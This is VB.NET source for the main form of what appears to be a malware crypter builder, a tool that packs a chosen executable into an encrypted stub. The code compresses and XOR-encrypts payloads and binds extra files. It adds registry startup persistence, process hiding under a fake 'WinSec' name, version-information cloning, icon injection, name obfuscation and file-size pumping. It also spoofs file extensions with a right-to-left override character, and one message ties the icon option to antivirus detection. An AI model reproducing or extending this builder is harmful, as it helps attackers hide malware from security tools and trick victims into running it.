#Region "Import"
Imports System.Text
Imports Mono.Cecil
Imports System.IO
Imports System.IO.Compression
Imports Mono.Cecil.Cil
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Management
Imports System.Security.Cryptography

#End Region

Public Class Form1
    'Public Sub New() 

    '    Seal.Initialize("") ' ici vous mettrez l'ID de votre programme
    '    InitializeComponent()


    'End Sub
#Region "Form Load"
    Private Sub Form_Load() Handles MyBase.Load

        Dim Mono As String = Application.StartupPath & "\Mono.Cecil.dll"
        Try
            If IO.File.Exists(Mono) = False Then
                IO.File.WriteAllBytes(Mono, My.Resources.Mono_Cecil)
                IO.File.SetAttributes(Mono, IO.FileAttributes.Hidden)
            Else
                IO.File.SetAttributes(Mono, IO.FileAttributes.Hidden)
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        TextBox2.Text = Rand(25)
    End Sub

#End Region



#Region "Button Open"
    Dim FileByte() As Byte
    Private Sub DesignButton1_Click(sender As Object, e As EventArgs) Handles DesignButton1.Click
        Dim o As New OpenFileDialog
        o.Filter = "Portable Executable |*.exe"
        If o.ShowDialog = vbOK Then
            TextBox1.Text = o.FileName
            FileByte = IO.File.ReadAllBytes(o.FileName)
            grpSetting.Enabled = True
            btnEncrypt.Enabled = True
            If isDotNet(FileByte) = True Then
                grpInject.Enabled = False
                chkRoot.Checked = False
            End If
        Else
            Exit Sub
        End If
    End Sub
    Function isDotNet(ByVal Data() As Byte) As Boolean
        Try
            System.Reflection.Assembly.Load(Data)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

#End Region

#Region "Random Key"
    Private Sub DesignButton2_Click(sender As Object, e As EventArgs) Handles DesignButton2.Click
        TextBox2.Text = Rand(15)
    End Sub
    Public Shared Function Rand(ByVal lenght As Integer) As String
        Dim A As New StringBuilder("")
        Dim B() As Char = "אבגדהוזחטיךכלםמןנסעףפץצקרשתװױײ׳״"
        For C As Integer = 1 To lenght
            Dim D As Integer = Int(((B.Length - 2) - 0 + 1) * Rnd()) + 1
            A.Append(B(D))
        Next
        Return A.ToString
    End Function
#End Region

#Region "Button Icon & Checkbox"
    Dim IconPath As String
    Private Sub DesignButton4_Click(sender As Object, e As EventArgs) Handles DesignButton4.Click
        Dim o As New OpenFileDialog
        o.Filter = "Icon File |*.ico"
        If o.ShowDialog = vbOK Then
            TextBox4.Text = o.FileName
            IconPath = o.FileName
            PictureBox2.ImageLocation = o.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked Then
            MsgBox("L'icon changer peut affecter les detection !", MsgBoxStyle.Information)
            grpIcon.Enabled = True
        Else
            grpIcon.Enabled = False
        End If
    End Sub
#End Region

#Region "Button Binder"
    Dim Extension As String
    Private Sub DesignButton3_Click(sender As Object, e As EventArgs) Handles DesignButton3.Click
        Dim o As New OpenFileDialog
        o.Filter = "Any File |*.*"
        If o.ShowDialog = vbOK Then
            txtBinder.Text = o.FileName
            Extension = IO.Path.GetExtension(o.FileName)
        Else
            Exit Sub
        End If
    End Sub
    Private Sub chkBinder_CheckedChanged(sender As Object) Handles chkBinder.CheckedChanged
        If chkBinder.Checked Then
            grpBinder.Enabled = True
        Else
            grpBinder.Enabled = False
        End If
    End Sub
#End Region

#Region "CheckBox Startup"
    Private Sub chkStartup_CheckedChanged(sender As Object) Handles chkStartup.CheckedChanged
        If chkStartup.Checked Then
            grpStartup.Enabled = True
        Else
            grpStartup.Enabled = False
        End If
    End Sub
#End Region

#Region "Assembly Cloner"
    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked Then
            grpClone.Enabled = True
        Else
            grpClone.Enabled = False
        End If
    End Sub

    Private Sub DesignButton5_Click(sender As Object, e As EventArgs) Handles DesignButton5.Click
        Dim o As New OpenFileDialog
        o.Filter = "Any File |*.*"
        If o.ShowDialog = vbOK Then
            txtClone.Text = o.FileName
            ReadAssembly(o.FileName)
        Else
            Exit Sub
        End If
    End Sub
    Dim Title As String
    Dim Description As String
    Dim Company As String
    Dim Product As String
    Dim Copyright As String
    Dim Trademark As String
    Dim v1 As String
    Dim v2 As String
    Dim v3 As String
    Dim v4 As String
    Sub ReadAssembly(ByVal Filepath As String)

        Dim f As FileVersionInfo = FileVersionInfo.GetVersionInfo(Filepath)
        Title = f.InternalName
        Description = f.FileDescription
        Company = f.CompanyName
        Product = f.ProductName
        Copyright = f.LegalCopyright
        Trademark = f.LegalTrademarks
        Dim version As String()
        If f.FileVersion.Contains(",") Then
            version = f.FileVersion.Split(","c)
        Else
            version = f.FileVersion.Split("."c)
        End If
        Try
            v1 = version(0)
            v2 = version(1)
            v3 = version(2)
            v4 = version(3)
        Catch ex As Exception

        End Try
    End Sub
#End Region

#Region "Button Crypt"
    Dim ASM As AssemblyDefinition
    Dim List As ListBox = New ListBox
    Dim SavePath As String
    Private Sub btnEncrypt_Click(sender As Object, e As EventArgs) Handles btnEncrypt.Click
        Try
            If TextBox1.Text = Nothing Then
                Call MsgBox("Please Select a File...", MsgBoxStyle.Critical)
                Exit Sub
            End If
            Try
                Dim s As New SaveFileDialog
                s.Filter = "Portable Executable |*.exe"
                If s.ShowDialog = vbOK Then
                    SavePath = s.FileName
                Else
                    Exit Sub
                End If
                Dim Src As String = My.Resources.Source
                Dim RESA As String = Application.StartupPath & "\Z.resources"
                Using A As New Resources.ResourceWriter(RESA)
                    A.AddResource("First", Encoding.Default.GetString(PolyIndia(Compress(FileByte))))
                    A.AddResource("Second", Encoding.Default.GetString(PolyIndia(Compress(My.Resources.Xenocode))))
                    If chkBinder.Checked Then
                        A.AddResource("Three", Encoding.Default.GetString(PolyIndia(Compress(IO.File.ReadAllBytes(txtBinder.Text)))))
                    End If
                    If chkHide.Checked Then
                        A.AddResource("Root", Encoding.Default.GetString(PolyIndia(Compress(My.Resources.DarkFire))))
                    End If
                    A.Generate()
                End Using
                If chkRoot.Checked Then
                    Src = Src.Replace("'ROOT", Nothing)
                End If
                If chkHide.Checked Then
                    Src = Src.Replace("'_HIDE", Nothing)
                End If
                Dim ASEM As String = My.Resources.Asem
                If chkAssembly.Checked Then
                    ASEM = ASEM.Replace("%Title%", Title)
                    ASEM = ASEM.Replace("%Description%", Description)
                    ASEM = ASEM.Replace("%Company%", Company)
                    ASEM = ASEM.Replace("%Product%", Product)
                    ASEM = ASEM.Replace("%Copyright%", Copyright)
                    ASEM = ASEM.Replace("%Trademark%", Trademark)
                    ASEM = ASEM.Replace("%FileVersion%", v1 & v2 & v3 & v4)
                    Src = Src.Replace("'[ASEMBLYCODE]", ASEM)
                Else
                    Src = Src.Replace("'[ASEMBLYCODE]", Nothing)
                End If
                Try
                    Dim snk As String = Application.StartupPath & "\pourquoi.snk"
                    IO.File.WriteAllBytes(snk, My.Resources.pourquoi)
                    Src = Src.Replace("STRONGNAMELOCATION", snk)
                Catch ex As Exception

                End Try
                If chkBinder.Checked = True Then
                    Src = Src.Replace("%BindCheck%", True)
                    Src = Src.Replace("%Extension%", Extension)
                    Src = Src.Replace("'BINDER", Nothing)
                    If chkrunOnce.Checked = True Then
                        Src = Src.Replace("%OnceCheck%", True)
                    Else
                        Src = Src.Replace("%OnceCheck%", False)
                    End If
                Else
                    Src = Src.Replace("%BindCheck%", False)
                    Src = Src.Replace("%OnceCheck%", False)
                End If
                Src = Src.Replace("%ProcessName%", TextBox8.Text)
                If chkStartup.Checked Then
                    Src = Src.Replace("%NON%", "Oui")
                    Src = Src.Replace("%Folder%", txtFolder.Text)
                    Src = Src.Replace("%Filename%", txtFilename.Text)
                    Src = Src.Replace("%KeyName%", txtKeyname.Text)
                Else
                    Src = Src.Replace("%NON%", "Non")
                    Src = Src.Replace("%Folder%", Nothing)
                    Src = Src.Replace("%Filename%", Nothing)
                    Src = Src.Replace("%KeyName%", Nothing)
                End If
                Compile(Src, SavePath, "_BASE")
                If chkIcon.Checked Then
                    IconInjector.InjectIcon(SavePath, IconPath)
                End If
                If Protectpart1(SavePath) = True Then
                    ASM.Write(SavePath)
                End If
                IO.File.Delete(RESA)
                MsgBox("Sucess !", MsgBoxStyle.Information)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        Catch ex As Exception

        End Try
    End Sub
    Public Shared Function PolyIndia(ByVal File As Byte()) As Byte()
        Dim ServicePro As New System.Security.Cryptography.RNGCryptoServiceProvider()
        Dim RetKey As Byte() = New Byte(16 - 1) {}
        Dim Result As Byte() = New Byte(16 + (File.Length - 1)) {}
        ServicePro.GetBytes(RetKey)
        Buffer.BlockCopy(RetKey, 0, Result, 0, 16)
        Buffer.BlockCopy(File, 0, Result, 16, File.Length)
        For i As Integer = 16 To Result.Length - 1
            Result(i) = Result(i) Xor RetKey(i Mod RetKey.Length)
        Next
        Return Result
    End Function
    Public Shared Function Compress(data As Byte()) As Byte()
        Dim output As New MemoryStream()
        Dim gzip As New GZipStream(output, CompressionMode.Compress, True)
        gzip.Write(data, 0, data.Length)
        gzip.Close()
        Return output.ToArray()
    End Function

    Private Sub DesignButton8_Click(sender As Object, e As EventArgs) Handles DesignButton8.Click
        Try
            Dim S As New SaveFileDialog
            S.Filter = "|*.exe"
            If S.ShowDialog = vbOK Then
                If Protectpart2() = True Then
                    ASM.Write(S.FileName)
                End If
                MsgBox("Sucessfully Obfuscated at: " & vbCrLf & S.FileName, MsgBoxStyle.Information)
            Else
                Exit Sub
            End If
        Catch ex As Exception

        End Try
    End Sub

    Public Function Protectpart2() As Boolean
        Dim FilePath As String
        Try
            ASM = AssemblyDefinition.ReadAssembly(FilePath)
            ASM.MainModule.Attributes = ModuleAttributes.Required32Bit
            Dim definition As TypeDefinition
            For Each definition In ASM.MainModule.Types
                If (definition.Name <> "<Module>") Then
                    Me.RenameTypesMethodsFields(definition, True, True, True)
                    Dim i As Integer
                    For i = 0 To 750 - 1
                        Dim item As New MethodDefinition(Me.SingleCharRename, (MethodAttributes.ReuseSlot Or MethodAttributes.Private), ASM.MainModule.Import(Type.GetType("System.Void")))
                        definition.Methods.Add(item)
                        item.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, CByte(&H2C)))
                        item.Body.Instructions.Add(Instruction.Create(OpCodes.Nop))
                        List.Items.Add(item)
                    Next i
                End If
            Next
            Dim definition3 As TypeDefinition
            For Each definition3 In ASM.MainModule.Types
                If (definition3.Namespace <> "") Then
                    Dim newValue As String = Me.SingleCharRename
                    Dim resource As Resource
                    For Each resource In ASM.MainModule.Resources
                        resource.Name = resource.Name.Replace(definition3.Namespace, newValue)
                    Next
                    definition3.Namespace = newValue
                End If
            Next
        Catch exception As Exception
            MessageBox.Show(exception.Message)
            Return False
        End Try
        Return True
    End Function

    Public Function Protectpart1(ByVal file As String) As Boolean
        Try
            ASM = AssemblyDefinition.ReadAssembly(File)
            ASM.MainModule.Attributes = ModuleAttributes.Required32Bit
            Dim definition As TypeDefinition
            For Each definition In ASM.MainModule.Types
                If (definition.Name <> "<Module>") Then
                    Me.RenameTypesMethodsFields(definition, True, True, True)
                    Dim i As Integer
                    For i = 0 To 750 - 1
                        Dim item As New MethodDefinition(Me.SingleCharRename, (MethodAttributes.ReuseSlot Or MethodAttributes.Private), ASM.MainModule.Import(Type.GetType("System.Void")))
                        definition.Methods.Add(item)
                        item.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, CByte(&H2C)))
                        item.Body.Instructions.Add(Instruction.Create(OpCodes.Nop))
                        List.Items.Add(item)
                    Next i
                End If
            Next
            Dim definition3 As TypeDefinition
            For Each definition3 In ASM.MainModule.Types
                If (definition3.Namespace <> "") Then
                    Dim newValue As String = Me.SingleCharRename
                    Dim resource As Resource
                    For Each resource In ASM.MainModule.Resources
                        resource.Name = resource.Name.Replace(definition3.Namespace, newValue)
                    Next
                    definition3.Namespace = newValue
                End If
            Next
        Catch exception As Exception
            MessageBox.Show(exception.Message)
            Return False
        End Try
        Return True
    End Function

    Private Sub RenameTypesMethodsFields(ByVal t As TypeDefinition, ByVal renameType As Boolean, ByVal renameMethods As Boolean, ByVal renameFields As Boolean)
        Dim definition As TypeDefinition
        For Each definition In t.NestedTypes
            Me.RenameTypesMethodsFields(definition, renameType, renameMethods, False)
        Next
        If renameFields Then
            Dim definition2 As FieldDefinition
            For Each definition2 In t.Fields
                definition2.Name = Me.SingleCharRename
            Next
        End If
        If renameMethods Then
            Dim definition3 As MethodDefinition
            For Each definition3 In t.Methods
                If ((Not definition3.IsConstructor AndAlso (definition3.Name <> "OnCreateMainForm")) AndAlso (Not definition3.Name.ToLower.StartsWith("get") AndAlso Not definition3.Name.ToLower.StartsWith("set"))) Then
                    definition3.Name = Me.SingleCharRename
                End If
            Next
        End If
        Dim str As String = Me.SingleCharRename
        Dim resource As Resource
        For Each resource In t.Module.Resources
            resource.Name = resource.Name.Replace(t.FullName, (t.Namespace & "." & str))
        Next
        If renameType Then
            t.Name = str
        End If
    End Sub
    Private Function SingleCharRename() As String
        Return Rand(20)
    End Function
    Public Sub Compile(ByVal Source As String, ByVal Out As String, ByVal ClassName As String, Optional ByVal Icon As String = "")
        Dim ProviderOptions As New Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")
        Dim CP As New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim P As New CodeDom.Compiler.CompilerParameters
        Dim s As New StringBuilder()
        s.Append(" /target:winexe")
        s.Append(" /platform:x86")
        s.Append(" /optimize+")
        P.GenerateExecutable = True
        P.OutputAssembly = Out
        If Icon = "" Then
        Else
            s.Append(" /win32icon:""" & Icon & """")
        End If
        P.EmbeddedResources.Add(Application.StartupPath & "\Z.resources")
        P.CompilerOptions += s.ToString()
        P.IncludeDebugInformation = False
        P.ReferencedAssemblies.Add("System.Dll")
        Dim Results1 = CP.CompileAssemblyFromSource(P, Source)
        For Each uii As CodeDom.Compiler.CompilerError In Results1.Errors
            MessageBox.Show(uii.ToString)
        Next
    End Sub
#End Region

#Region "Button Open Scanner"
    Private Sub DesignButton7_Click(sender As Object, e As EventArgs) Handles DesignButton7.Click
        Me.Hide()
        Scanner.Show()
    End Sub
#End Region

#Region "Hide Process"
    Private Sub chkHide_CheckedChanged(sender As Object) Handles chkHide.CheckedChanged
        If chkRoot.Checked = True Then
            MsgBox("You Can't use Process Hider and Persitance" & vbCrLf & "Please Disable Persistance...", MsgBoxStyle.Information)
            chkHide.Checked = False
        End If
        If chkHide.Checked Then
            TextBox8.Enabled = False
            TextBox8.Text = "WinSec"
            chkRoot.Enabled = False
        Else
            chkRoot.Enabled = True
            TextBox8.Enabled = True
            TextBox8.Text = "WinSec"
        End If
    End Sub
#End Region

    Private Sub DesignButton6_Click(sender As Object, e As EventArgs) Handles DesignButton6.Click
        Dim ob As New OpenFileDialog
        ob.Filter = "Portable Executable |*.exe"
        If ob.ShowDialog = vbOK Then
            TextBox3.Text = ob.FileName
            FileByte = IO.File.ReadAllBytes(ob.FileName)
            grpSetting.Enabled = True
            btnEncrypt.Enabled = True
            If isDotNet(FileByte) = True Then
                grpInject.Enabled = False
                chkRoot.Checked = False
            End If
        Else
            Exit Sub
        End If
    End Sub

    

    Private Sub DesignButton9_Click(sender As Object, e As EventArgs) Handles DesignButton9.Click
        Dim filesize As Double = Val(NumericUpDown1.Value)
        If DeumosRadioButton1.Checked Then
            filesize = filesize * 1024
        End If
        If DeumosRadioButton2.Checked Then
            filesize = filesize * 1048576
        End If
        Dim filetopump = IO.File.OpenWrite(TextBox1.Text)
        Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
        While size < filesize
            filetopump.WriteByte(0)
            size += 1
        End While
        filetopump.Close()
        MsgBox("File Pumped!", MsgBoxStyle.Information)
    End Sub


    Private Sub DesignButton10_Click(sender As Object, e As EventArgs) Handles DesignButton10.Click
        My.Computer.FileSystem.RenameFile(TextBox1.Text, TextBox1.Text & "‮" & StrReverse(TextBox5.Text) & ".exe")
    End Sub
End Class

#Region "Icon Injector"
Public Class IconInjector

    <SuppressUnmanagedCodeSecurity()> _
    Private Class NativeMethods
        <DllImport("kernel32")> _
        Public Shared Function BeginUpdateResource( _
            ByVal fileName As String, _
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Public Shared Function UpdateResource( _
            ByVal hUpdate As IntPtr, _
            ByVal type As IntPtr, _
            ByVal name As IntPtr, _
            ByVal language As Short, _
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)> _
            ByVal data() As Byte, _
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("kernel32")> _
        Public Shared Function EndUpdateResource( _
            ByVal hUpdate As IntPtr, _
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class

    ' The first structure in an ICO file lets us know how many images are in the file.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIR
        Public Reserved As UShort  ' Reserved, must be 0
        Public Type As UShort      ' Resource type, 1 for icons.
        Public Count As UShort     ' How many images.
        ' The native structure has an array of ICONDIRENTRYs as a final field.
    End Structure

    ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
    ' starts in the file. The other fields give the information required to turn that image data into a valid
    ' bitmap.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIRENTRY
        Public Width As Byte            ' Width, in pixels, of the image
        Public Height As Byte           ' Height, in pixels, of the image
        Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
        Public Reserved As Byte         ' Reserved ( must be 0)
        Public Planes As UShort         ' Color Planes
        Public BitCount As UShort       ' Bits per pixel
        Public BytesInRes As Integer   ' Length in bytes of the pixel data
        Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
    End Structure

    ' Each image is stored in the file as an ICONIMAGE structure:
    'typdef struct
    '{
    '   BITMAPINFOHEADER   icHeader;      // DIB header
    '   RGBQUAD         icColors[1];   // Color table
    '   BYTE            icXOR[1];      // DIB bits for XOR mask
    '   BYTE            icAND[1];      // DIB bits for AND mask
    '} ICONIMAGE, *LPICONIMAGE;


    <StructLayout(LayoutKind.Sequential)> _
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure

    ' The icon in an exe/dll file is stored in a very similar structure:
    <StructLayout(LayoutKind.Sequential, Pack:=2)> _
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = iconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub

    Private Class IconFile

        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte

        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property

        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
            End Get
        End Property

        Private Sub New()
        End Sub

        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            ' Read all the bytes from the file.
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            ' First struct is an ICONDIR
            ' Pin the bytes from the file in memory so that we can read them.
            ' If we didn't pin them then they could move around (e.g. when the
            ' garbage collector compacts the heap)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            ' Read the ICONDIR
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
            Dim offset = Marshal.SizeOf(instance.iconDir)
            ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i = 0 To instance.iconDir.Count - 1
                ' Grab the structure.
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                ' Grab the associated pixel data.
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function

        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            ' This will store the memory version of the icon.
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function

    End Class

End Class
#End Region